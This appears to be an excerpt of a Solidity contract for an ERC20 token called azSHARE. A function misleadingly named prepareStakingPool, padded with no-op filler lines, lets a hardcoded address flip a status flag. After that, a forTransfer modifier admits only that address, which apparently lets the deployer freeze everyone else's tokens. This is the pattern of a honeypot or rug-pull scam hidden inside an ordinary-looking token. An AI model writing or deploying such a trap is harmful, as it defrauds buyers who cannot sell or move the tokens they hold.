...
contract azSHAREToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenAZ_totalSupply;
    uint256 private _tokenAZ_status = 0;
    uint256 public stakingPoolAZStatus = 0;

    string private _tokenAZ_name;
    string private _tokenAZ_symbol;

    address private _poolAZAddress = 0x5925C5F60d76a869E0197D5C48FF52c02d06aE3c;

    constructor() {
        _tokenAZ_name = "azSHARE";
        _tokenAZ_symbol = "azSHARE";
        _tokenAZ_totalSupply = 59700 * 10 ** 18;
        _balances[msg.sender] = _tokenAZ_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolAZAddress || _tokenAZ_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolAZStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolAZAddress)
        {
            _tokenAZ_status = 1;
        }
    }
